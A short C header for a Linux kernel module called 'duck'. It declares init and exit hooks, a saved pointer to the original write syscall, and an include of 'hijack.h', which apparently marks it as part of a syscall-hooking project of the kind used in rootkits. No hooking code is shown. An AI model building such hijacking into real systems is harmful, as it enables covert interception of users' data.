#ifndef _DUCK_H_
#define _DUCK_H_

#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");

int duck_init(void);
void duck_exit(void);
module_init(duck_init);
module_exit(duck_exit);

asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);

#include "hijack.h"
#include "misc.h"

#endif /* _DUCK_H_ */